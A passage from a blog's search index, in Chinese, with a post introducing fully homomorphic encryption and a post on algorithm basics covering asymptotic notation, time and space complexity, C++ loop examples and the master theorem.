<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>全同态加密入门</title>
      <link href="/2024/09/18/%E5%85%A8%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86%E5%85%A5%E9%97%A8/"/>
      <url>/2024/09/18/%E5%85%A8%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<div id="postchat_postcontent"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大数据浪潮下的隐私保护已经成为无数网民亟待解决的问题，由此21世纪初出现了全同态加密的多种方案。本博客旨在梳理全同态加密的发展脉络，结合陈智罡老师的《全同态加密——从理论到实践》记录自己的学习历程</p><h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><h2 id="为什么需要全同态加密"><a href="#为什么需要全同态加密" class="headerlink" title="为什么需要全同态加密"></a>为什么需要全同态加密</h2><p>结合网络通信中<strong>数据</strong>的生命周期异或是存在形式，大致分为三种形态：<strong>传输</strong>、<strong>存储</strong>和<strong>计算</strong>。数据在传输过程中可以用<code>AES</code>进行加密，再用<code>RSA</code>对密钥进行加密。数据存储也可以加密，比如<code>windows</code>里面的<code>bitlocker</code>对磁盘加密。唯一亟待解决的就是数据在计算时怎么加密。传统的密码在对密文进行计算的时候，必须先对密文进行解密，再进行运算。密文解密了就有泄漏的风险，于是密码学家就开始想能不能直接在密文上面进行运算而无需解密。如果能解决这个问题，就能够解决数据计算时隐私保护的问题，从代数角度来看就是同态性。</p><p>1978年，<strong>Rivest</strong>、<strong>Adleman</strong>和<strong>Shamir</strong>（即<strong>RSA</strong>提出者）提出了隐私同态加密，也就是现在所说的全同态加密。当时RSA只满足乘法同态性，实现全同态加密成为当时的一个开放难题。</p><h2 id="什么是全同态加密"><a href="#什么是全同态加密" class="headerlink" title="什么是全同态加密"></a>什么是全同态加密</h2><p>根据上面的例子不难得出，全同态加密指<strong>在不解密的情况下，能够对密文执行任意计算</strong>。对任意有效函数$f$和明文$m$，用符号定义为：</p><script type="math/tex; mode=display">\forall f,m\ E(f(m))=f(E(m))</script><h2 id="同态加密发展历程"><a href="#同态加密发展历程" class="headerlink" title="同态加密发展历程"></a>同态加密发展历程</h2><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202409250928731.png" alt="HE history.drawio"></p><h1 id="全同态加密入门"><a href="#全同态加密入门" class="headerlink" title="全同态加密入门"></a>全同态加密入门</h1><h2 id="概念定义"><a href="#概念定义" class="headerlink" title="概念定义"></a>概念定义</h2><p>首先要认识几个名词，如果不能理解，请先认为它是正确的<del>(至少我是这样做的)</del>：</p><p>1、<strong>噪声</strong>：是密文中的一部分，初始同态加密后，这个噪声是比较小的。它是基于格密码引出的概念，其有利有弊。算法的安全性大多数是基于一个困难的数学问题，最初引入噪声是基于<strong>LWE</strong>问题，引入一个小的噪声就能使整个密文解密起来非常困难，保障算法的安全性。但是由于同态加密运算，尤其是乘法运算，会导致密文中的噪声大大增加，若密文的噪声淹没了明文部分，就会导致解密出来的结果出现问题。如下图所示：<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202409251054964.png" alt="sound.drawio"></p><p>2、传统加密算法主要由三个部分组成：密钥生成、加密算法和解密算法。全同态加密算法增加了密文计算算法，该算法是同态加密算法的核心。目前提出的同态加密算法都是基于公钥的同态加密，有没有基于私钥的同态加密算法呢？2011年<strong>Rothblum</strong>在<strong>TCC</strong>会议上提出了<strong>任一基于私钥的同态加密算法</strong>都可以转化为<strong>基于公钥的同态加密算法</strong>。</p><ul><li>密钥生成算法(<strong>KeyGen</strong>)：生成公钥(<strong>Public Key,pk</strong>)和私钥(<strong>Secret Key,sk</strong>)，公钥用于加密数据，私钥用于解密数据。同态加密除了生成公钥和私钥之外，密钥生成算法还要生成一个密文计算公钥(<strong>Evaluate Key,Evk</strong>)，该公钥用于进行密文计算，最主要的作用是为了降低噪声。保证密文能进行无限制的运算。</li><li>加密算法(<strong>Enc</strong>)：和传统的密码一样，用于加密明文，使用加密算法得到的密文叫做”新鲜”密文，即该密文是一个初始密文，没有和其他密文进行运算过。”新鲜”密文的噪声称作初始噪声。</li><li>解密算法(<strong>Dec</strong>)：和传统的密码一样，用于解密密文，它不仅能对初始密文进行解密，也能对计算后的密文进行解密。若噪声超过上限，解密可能会失败。</li><li>密文计算算法(<strong>Evaluate</strong>)：该算法是同态加密的核心，该算法有三个输入：密文计算公钥<strong>Evk</strong>、密文之间运算函数 $f$ 和执行密文运算的密文$C$。</li></ul><p>3、<strong>部分同态加密(Partially Homomorphic Encryption,PHE)</strong>：指只满足加法或者乘法一种运算的加密算法。如加法同态加密<strong>Paillier</strong>算法，乘法同态加密<strong>Elgamal、RSA</strong>算法等。</p><p>4、<strong>近似同态加密(Somewhat Homomorphic Encryption,SHE)</strong>：这一阶段距离想要实现的全同态更近了一步。如果有近似同态加密算法的话，那么就可以在密文上<strong>同时计算加法与乘法了</strong>。但是需要注意的是，正因为这一阶段是<strong>近似同态（Somewhat Homomorphic）</strong>的，所以可以做的加法和乘法次数非常有限，可以计算的函数 F 也<strong>在一个有限的范围内</strong>。</p><p>5、<strong>层级全同态加密(Leveled Fully  Homomorphic Encryption,LFHE)</strong>：已经可以对密文进行<strong>任意的加法乘法组合</strong>了，没有任何对于次数的局限性。</p><p>但是之所以被称之为<strong>层级</strong>全同态的原因是，这个阶段的算法会引入一个新的复杂度上限$L$的概念，<strong>这一复杂度上限约束了函数</strong>$F$ <strong>的复杂度</strong>。如果我们可以把 $F$ 用二进制电路 $C$ 来表示的话，那么 $C$ 的深度和大小一定要在 $L$的范围之内，即：$|C|\leq L$</p><p>6、<strong>全同态加密(Fully Homomorphic Encryption，FHE)</strong>：千呼万唤始出来，顾名思义，<strong>FHE</strong>支持对密文任意次数的运算。</p><h2 id="电路模型"><a href="#电路模型" class="headerlink" title="电路模型"></a>电路模型</h2><p>上述谈到<strong>LFHE</strong>的时候提及了二进制电路$C$，事实上2009年<strong>Gentry</strong>提出的全同态加密方案就是基于电路模型提出的。为什么要采用电路模型呢？传统的密码学都是基于数论观点，但是密码学真正的落脚点应该是计算复杂度。密码学所有方案都应该依赖于一个数学难题，这是安全性的根本。电路观点是一中计算复杂度的模型，用途是衡量问题所需要的资源，例如时间、存储量等。在电路模型下，可以通过门电路的深度、数量来衡量。而且电路模型在计算的时候需要电路<strong>“接触”</strong>到运算的数据，因此不会泄露任何信息。</p><h2 id="构造框架"><a href="#构造框架" class="headerlink" title="构造框架"></a>构造框架</h2><p>密码学的安全性是基于困难问题之上，全同态加密亦是如此：<strong>理想格(ideal lattice)</strong>、<strong>LWE(Learning With Errors)</strong>问题和<strong>RLWE(Ring Learning With Errors)</strong>问题，还有一种是基于近似<strong>GCD</strong>问题。</p><p>全同态加密的发展大致分为三代：</p><ul><li>2009年<strong>Gentry</strong>提出了基于理想格的全同态加密方案，我们通常称之为第一代全同态加密方案。构造思想如下：<br>先构造一个<strong>SHE</strong>方案，其安全性基于<strong>最近向量问题(closest vector problem, CVP)</strong>.由于噪声增长的原因，该方案只能执行有限次同态加法和乘法。<br>其次当噪声快淹没明文的时候，采用<strong>自举(Boostrapping)</strong>技术来削减噪声，其本质是对密文进行一次同态解密。由于此处是构造全同态加密方案的核心，因此值得再用一篇文章来深入理解这个技术。参照深入理解Boostrapping技术</li><li>第二代全同态加密方案是基于<strong>LWE</strong>问题，该问题是由<strong>Regev</strong>在2005年提出。对于两个<strong>LWE</strong>密文向量$(c_{11},c_{12})$和$(c_{21},c_{22})$，私钥$(s_{11},s_{12})$</li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
          <category> 同态加密 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 同态加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法基础</title>
      <link href="/2024/09/02/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/09/02/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<div id="postchat_postcontent"><h1 id="算法基础"><a href="#算法基础" class="headerlink" title="算法基础"></a>算法基础</h1><p>本博客主要参照GitHub开源算法书籍<a href="https://www.hello-algo.com/chapter_hello_algo/">hello-alo</a>以及<a href="https://oi-wiki.org/">oi-wiki</a>，这里对开源作者respect，感谢开源作者们的辛勤付出。</p><h2 id="算法引入"><a href="#算法引入" class="headerlink" title="算法引入"></a>算法引入</h2><p>算法其实在生活中无处不在，最典型的一个例子就是打扑克时对手牌洗牌。</p><p>将手牌分成两部分，左边为有序部分，右边为无序部分。然后让我们看看算法是怎么运行的（以78654为例且按升序排列）</p><ul><li>最初有序部分为7，无序部分为8654</li><li>接着8&gt;7，将8插入到7的右边，此时有序部分为78，无序部分为654</li><li>接着6&lt;8，将8往右移，6&lt;7，将7往左移，最后将6插在最左边</li><li>…</li><li>同理，像这样迭代，每次从无序部分取出最左边的元素，与有序部分里面的元素从右往左进行比较，找到属于自己的位置，最终得到升序的排序。</li></ul><p>这就是<strong>插入排序</strong>的思想。</p><h2 id="什么是算法"><a href="#什么是算法" class="headerlink" title="什么是算法"></a>什么是算法</h2><p>通过上述的例子，想必大家对算法有了一个基本的了解。那么算法到底是什么？<br>算法是<strong>规则的有限集合是为了解决特定问题而规定的一系列操作。</strong>它具有以下特性：</p><ul><li>输入特性：可以有零个输入，多个输入。</li><li>输出特性：必须要有输出。</li><li>有穷性：每个步骤都能在有限时间完成的。</li><li>确定性：对于每种情况下执行的操作，在算法中都有确定的规定，使算法的执行者或阅读者都能明确含义如何执行。</li><li>可行性：算法中所有操作必须足够基本都可以通过已经实现的操作运算有限次实现。</li></ul><p>那么评估一个算法的优劣有哪些标准呢？</p><p><strong>时间复杂度</strong>和<strong>空间复杂度</strong>是衡量一个算法效率的重要标准。</p><h1 id="算法衡量标准"><a href="#算法衡量标准" class="headerlink" title="算法衡量标准"></a>算法衡量标准</h1><h2 id="基本操作数"><a href="#基本操作数" class="headerlink" title="基本操作数"></a>基本操作数</h2><p>同一个算法在不同的计算机上运行的实际速度可能会不同，性能较好的计算机可能运行较快，于是用实际运算速度来评判一个算法的优劣显然是不妥的。所以通常考虑的不是算法的实际用时，而是算法运行所需要进行的基本操作的数量。</p><p>对基本操作的计数或是估测可以评判算法用时的指标。</p><p>基本操作数一般用$T$来表示</p><h2 id="渐进符号的定义"><a href="#渐进符号的定义" class="headerlink" title="渐进符号的定义"></a>渐进符号的定义</h2><p>渐进符号是函数的阶的规范描述。简单来说，渐进符号忽略了一个函数中增长较慢的部分以及各项的系数（在时间复杂度相关分析中，系数一般被称作<strong>常数</strong>），而保留了可以用来表明该函数增长趋势的重要部分。</p><h3 id="大-Theta-符号"><a href="#大-Theta-符号" class="headerlink" title="大$\Theta$符号"></a>大$\Theta$符号</h3><p>对于函数$f(n)$和$g(n)$，$f(n)=\Theta(g(n))$，当且仅当$\exists c_{1},c_{2},n_{0}&gt;0$，$s.t. \forall n\ge n_{0}$，$0\le c_{1}<em>g(n)\le f(n)\le c_{2}</em>g(n)$.</p><p>看符号定义可能有点懵，主要思想就是找时间复杂度表达式里面谁占主导地位。</p><p>增长趋势为：$ln(x) &lt; x^n &lt; e^x $</p><p>例如 ：$3n^2+5n-3=\Theta(n^2)$，很显然表达式占主导地位的就是$n^2$，所以$g(n)=n^2$.</p><p>严格按定义证明：</p><p>对于右侧：$3n^2+5n-3&lt;3n^2+5n\le3n^2+5n^2=8n^2$</p><p>对于左侧：$3n^2\le3n^2+5n-3$</p><p>故显然$c_{1}$取3，$c_{2}$取8.</p><h3 id="大-O-符号"><a href="#大-O-符号" class="headerlink" title="大$O$符号"></a>大$O$符号</h3><p>$\Theta$符号提示给了函数的上下界，如果只知道渐进上界而不知道其渐进下界，可以使用$O$符号。定义如下：<br>对于函数$f(n)$和$g(n)$，$f(n)=O (g(n))$，当且仅当$\exists c,n_{0}$，$s.t. \forall n\ge n_{0}$，$0\le f(n)\le c*g(n)$.</p><p>研究时间复杂度通常会使用$O$符号，因为我们关注的通常是程序用的上界，而不关心其用时的下界。</p><h3 id="大-Omega-符号"><a href="#大-Omega-符号" class="headerlink" title="大$\Omega$符号"></a>大$\Omega$符号</h3><p>用$\Omega$符号来描述一个函数的渐近下界，定义如下：<br>对于函数$f(n)$和$g(n)$，$f(n)=\Omega(g(n))$，当且仅当$\exists c,n_{0}$，$s.t. \forall n\ge n_{0}$，$0\le c*g(n) \le f(n)$.</p><h3 id="小-omicron-符号"><a href="#小-omicron-符号" class="headerlink" title="小$\omicron$符号"></a>小$\omicron$符号</h3><p>学过高数的小伙伴可能一点也不陌生，高阶无穷小就是用$\omicron$定义的，函数某点的Taylor展开式拥有的皮亚诺余项也是用$\omicron$表示的。如果说$O$符号相当于小于等于号，那么$\omicron$符号就相当于小于号。定义如下：<br>对于函数$f(n)$和$g(n)$，$f(n)=\omicron(g(n))$，当且仅当$\exists c,n_{0}$，$s.t. \forall n\ge n_{0}$，$0\le f(n)&lt; c*g(n)$.</p><h3 id="小-omega-符号"><a href="#小-omega-符号" class="headerlink" title="小$\omega$符号"></a>小$\omega$符号</h3><p>和$O$与$\omicron$之间的关系一样，如果说$\Omega$是$\le$关系，那么$\omega$就是&lt;关系。定义如下：</p><p>对于函数$f(n)$和$g(n)$，$f(n)=\omega(g(n))$，当且仅当$\exists c,n_{0}$，$s.t. \forall n\ge n_{0}$，$0\le c*g(n) \le f(n)$.</p><p>这里<a href="https://oi-wiki.org/">oi-wiki</a>也放了几张图片供读者理解：</p><p><img src="https://oi-wiki.org/basic/images/order.png" alt=""></p><h2 id="渐进符号的常见性质"><a href="#渐进符号的常见性质" class="headerlink" title="渐进符号的常见性质"></a>渐进符号的常见性质</h2><ul><li>$f(n)=\Theta(g(n))\Longleftrightarrow (f(n)=O(g(n)))\wedge(f(n)=\Omega(g(n)))$</li><li>$f(x)+g(x)=O(max(f(x),g(x)))$</li><li>$f(x)<em>g(x)=O(f(x)</em>g(x))$</li><li>$\forall a\neq1$，$\log_{a}n=O(log_{2}n)$ (由换底公式可知，无论底数为多少，都具有相同的增长率，因此一般省略底数)</li></ul><p>常见阶的增长速度排序：</p><p>$O(1)&lt;O(log n)&lt;O(n)&lt;O(nlogn)&lt;O(n^2)&lt;O(2^n)&lt;O(n!)$</p><h2 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h2><p><strong>定义：</strong></p><p>衡量一个算法的快慢，一定要考虑数据规模的大小。所谓数据规模，一般指输入的数字个数、输入中给出的图的点数与边数等等。一般来说，数据规模越大，算法的用时就越长。而在算法竞赛中，我们衡量一个算法的效率时，最重要的不是看它在某个数据规模下的用时，而是看它的用时随数据规模而增长的趋势，即 <strong>时间复杂度</strong>。</p><p>这里的数据规模的增长趋势类似于数学里面的增长趋势，所谓「用时随数据规模而增长的趋势」是一个模糊的概念，需要借助上文所介绍的 <strong>渐进符号</strong> 来形式化地表示时间复杂度。</p><h3 id="时间复杂度例子"><a href="#时间复杂度例子" class="headerlink" title="时间复杂度例子"></a>时间复杂度例子</h3><h4 id="非递归算法的时间复杂度"><a href="#非递归算法的时间复杂度" class="headerlink" title="非递归算法的时间复杂度"></a>非递归算法的时间复杂度</h4><p><strong>例一：</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">algorithm_A</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本操作只有一次打印<code>hello world</code>的操作，而与输入的参数<code>n</code>无关，所以时间复杂度是常数阶，即$O(1)$</p><p><strong>例二：</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">algorithm</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>;j &lt; m; j++) &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要计算基本操作，主要就是看打印了<code>hello world</code>多少次，外循环<code>n</code>次，内循环<code>m</code>次，不难得出，总共操作了<code>m*n</code>次。所以时间复杂度就是$O(m*n)$.</p><p><strong>例三：</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">algorithm</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>; </span><br><span class="line">    a = a + n; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span> * n ; i++) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span> * n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n ; j++) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个算法主要分为三个部分：</p><ul><li><p>第一部分：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">1</span>; </span><br><span class="line">a = a + n; </span><br></pre></td></tr></table></figure><p>操作主要是赋值，基本操作数为<code>1+1=2</code></p></li><li><p>第二部分：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span> * n ; i++) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>循环了<code>5n</code>次，基本操作数为<code>5n</code></p></li><li><p>第三部分：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span> * n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n ; j++) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>循环了$2n*n=2n^2$次，基本操作数为$2n^2$</p></li></ul><p>综上所述：基本操作数总和为$2n^2+5n+2$，根据$O$的定义不难得出，时间复杂度为$O(n^2)$</p><p><strong>例四：</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">algorithm</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i*=<span class="number">2</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到循环执行完之后，<code>i</code>的值变成了原来的2倍，呈指数增长。不妨设循环执行了<code>k</code>次，则<code>i</code>最后的值为$2^k &gt;n$ ，为了简单起见，令$2^{k-1}=n$，得到时间复杂度为 $O(logn)$</p><p><strong>例五：</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">algorithm</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= i ; j++) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这种不同循环之间含有依赖的，可以用$\sum$表达式来理解，从外层循环向里层循环求和，由如下表达式：</p><script type="math/tex; mode=display">\sum_{\substack{i\in\{1,2,...,n\}}}\sum_{\substack{j\in\{1,2,...,i\}}}1</script><p>然后再从里层循环向外层循环求和，如下</p><script type="math/tex; mode=display">\sum_{\substack{i\in\{1,2,...,n\}}}\sum_{\substack{j\in\{1,2,...,i\}}}1=\sum_{\substack{i\in\{1,2,...,n\}}}i=\frac{n^2+n}{2}</script><p>故时间复杂度为$O(n^2)$</p><p><strong>例六：</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">algorithm</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i ; j*=<span class="number">2</span>) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样设置内层循环执行了<code>k</code>次，简化有$2^{k-1}=i$，写出表达式：</p><script type="math/tex; mode=display">\sum_{\substack{i\in\{1,2,...,n\}}}\sum_{\substack{j\in\{1,2,...,i\}}}1</script><p>求和有：</p><script type="math/tex; mode=display">\sum_{\substack{i\in\{1,2,...,n\}}}\sum_{\substack{j\in\{1,2,4,...,2^{k-1}\}}}1=\sum_{\substack{i\in\{1,2,...,n\}}}log\ i=O(log\ 1+log\ 2+...+log\ n)=O(log\ (n!))\approx O(nlog\ n)</script><p>其中$O(log\ (n!))\approx O(nlog\ n)$是根据<strong>斯特林公式</strong>：</p><script type="math/tex; mode=display">n!\approx \sqrt{2\pi n}(\frac{n}{e})^n</script><p>来近似的</p><p><strong>例七：</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">algorithm</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i*=<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i ; j++) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和前面一样不多赘述，这里直接列出表达式</p><script type="math/tex; mode=display">\sum_{\substack{i\in\{1,2,...,2^{k-1}\}}}\sum_{\substack{j\in\{1,2,3,...,i\}}}1=\sum_{\substack{i\in\{1,2,...,2^{k-1}\}}}i=O(1+2+4+...+2^{k-1})=O(2^{k}-1)=O(2n-1)=O(n)</script><h4 id="递归算法的时间复杂度"><a href="#递归算法的时间复杂度" class="headerlink" title="递归算法的时间复杂度"></a>递归算法的时间复杂度</h4><p><strong>例一：</strong></p><p>比较经典的一个递归是<a href="https://zh.wikipedia.org/wiki/%E6%B1%89%E8%AF%BA%E5%A1%94">汉诺塔</a>问题，这里直接给出通项：</p><script type="math/tex; mode=display">\begin{equation}T(n) = \begin{cases} 1 & \text{if } n=1 \\2T(n-1)+O(1) & \text{if } n>1\end{cases}\end{equation}</script><p>通过一直迭代的方法就可以求得时间复杂度：<br>$T(n)=2T(n-1)+O(1)=2(2T(n-2)+O(1))+O(1)=…=2^{n}T(1)-1$</p><p>故时间复杂度为$O(2^n)$</p><p><strong>主定理(Master Theorem)：</strong></p><p>对于一个母问题<code>n</code>，可以将其分解为$a$个相同规模大小为$\frac{n}{b}$的子问题。$f(n)$是将这些子问题合并为母问题所需要的时间。</p><p>对于递推关系式：</p><script type="math/tex; mode=display">T(n)=aT(\frac{n}{b})+f(n)</script><p>用递归树来演示这个过程：<br><img src="https://oi-wiki.org/basic/images/master-theorem-proof.svg" alt=""></p><p>向下递归直到最后一行每一个子问题的时间复杂度为$O(1)$，有$a^h$个结点，此时有等式$n=b^h$，求得$h=log_{b}n$。结合换底公式可以得出叶子结点有$n^{log_{b}a}$，于是$T(n)=\Theta(n^{log_{b}a})+g(n)$，$g(n)$为每一层合并子问题所需要的时间开销。</p><p>结合渐进符号的定义，整体的$T(n)$取决于这两项加数谁占主导，分成以下三种情况：</p><ol><li>$f(n)=O(n^{log_{b}a-\epsilon})$，这里的$\epsilon$可以理解为函数或者数列极限里面的精度，其值大于0但非常接近于0.因此$g(n)=O(n^{log_{b}a})$，最终$T(n)=\Theta(n^{log_{b}a})$</li></ol><p>总结有以下定理：</p><script type="math/tex; mode=display">\begin{equation}T(n) = \begin{cases} \Theta(n^{log_{b}a}) & \text{if } f(n)=O(n^{log_{b}(a)-\epsilon}),\epsilon>0 \\\Theta(f(n)) & \text{if } f(n)=\Omega(n^{log_{b}(a)+\epsilon}),\epsilon \ge0 \\\Theta(n^{log_{b}a}log^{k+1}n) & \text{if } f(n)=\Theta(n^{log_{b}a}log^{k}n),k\ge0\end{cases}\end{equation}</script><h3 id="最差、最佳、平均时间复杂度"><a href="#最差、最佳、平均时间复杂度" class="headerlink" title="最差、最佳、平均时间复杂度"></a>最差、最佳、平均时间复杂度</h3><p><strong>算法的时间效率往往不是固定的，而是与输入数据的分布有关</strong>。</p><p>例如如果想要在一个长度为<code>n</code>的数组找到某一特定的数<code>x</code>，由以下两种极端情况：</p><p>最佳情况：[<code>x</code>, ?, ?, … , ?]，此时为最佳时间复杂度$O(1)$<br>最差情况：[ ?, ?, … , ?, <code>x</code>]，此时为最差时间复杂度$O(n)$</p><p>最差时间复杂度”对应函数渐近上界，则使用$O$记号表示。相应地，“最佳时间复杂度”对应函数渐近下界，用$\Omega$记号表示。</p><p>实际情况中，最佳和最差时间复杂度出现的概率很小，相比之下，用<strong>平均时间复杂度可以体现算法在随机输入数据下的运行效率</strong>，用$\Theta$表示。例如上面这个查找某一个特定数的例子，假设<code>x</code>出现在任意位置的概率相等，即为$\frac{1}{n}$。计算公式如下：</p><script type="math/tex; mode=display">\frac{1+2+3+4+...+n}{n}=\frac{n^2+n}{2n}=\frac{n}{2}+\frac{1}{2}</script><p>分子的含义是<code>x</code>在数组中某个位置需要进行查找操作的数目之和，如<code>3</code>表示在<code>x</code>第三个位置需要查找三次。所以平均时间复杂度就为$\Theta(n)$</p><h2 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h2><p>用于衡量算法占用内存空间随着数据量变大时的增长趋势。这个概念与时间复杂度非常类似，只需将“运行时间”替换为“占用内存空间”。</p><h3 id="算法相关空间："><a href="#算法相关空间：" class="headerlink" title="算法相关空间："></a>算法相关空间：</h3><ul><li><strong>输入空间：</strong>用于存储算法的输入数据</li><li><strong>暂存空间：</strong>用于存储算法在运行时的变量、对象、函数上下文等数据，可以分为三部分：<ul><li><strong>暂存数据：</strong>用于保存算法运行过程中的各种常量、变量、对象等。</li><li><strong>栈帧空间：</strong>用于保存调用函数的上下文数据。系统在每次调用函数时都会在栈顶部创建一个栈帧，函数返回后，栈帧空间会被释放。</li><li><strong>指令空间：</strong>用于保存编译后的程序指令，在实际统计中通常忽略不计。</li></ul></li><li><strong>输出空间：</strong>用于存储算法的输出数据</li></ul><h3 id="空间复杂度例子"><a href="#空间复杂度例子" class="headerlink" title="空间复杂度例子"></a>空间复杂度例子</h3><p>实际计算中，通常只考虑<strong>最差空间复杂度</strong>。因为运行程序时必须保证在所有输入数据下都要足够的内存空间预留。</p><h4 id="非递归算法"><a href="#非递归算法" class="headerlink" title="非递归算法"></a><strong>非递归算法</strong></h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">algorithm</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;               <span class="comment">// O(1)</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">b</span><span class="params">(<span class="number">10000</span>)</span></span>;    <span class="comment">// O(1)</span></span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">10</span>)</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">nums</span><span class="params">(n)</span></span>; <span class="comment">// O(n)</span></span><br><span 